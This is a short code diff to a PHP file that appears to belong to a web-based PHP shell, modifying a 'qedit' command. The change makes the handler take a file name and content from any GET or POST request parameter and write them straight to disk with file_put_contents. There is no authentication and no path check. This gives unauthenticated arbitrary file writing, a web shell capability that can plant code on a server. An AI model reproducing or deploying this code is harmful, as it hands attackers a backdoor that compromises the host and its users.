@@ -6,8 +6,9 @@ function phpshell_qedit($args){
 
 }
 
-if(isset($_POST['qedit_content']) && isset($_POST['qedit_fn'])){
-    echo file_put_contents($_POST['qedit_fn'],$_POST['qedit_content']);
+if(isset($_REQUEST['qedit_content']) && isset($_REQUEST['qedit_fn'])){
+    echo file_put_contents($_REQUEST['qedit_fn'],$_REQUEST['qedit_content']);
+    exit;
 }
 
 registerCommand('phpshell_qedit','qedit','Edit various data files. supported: txt');
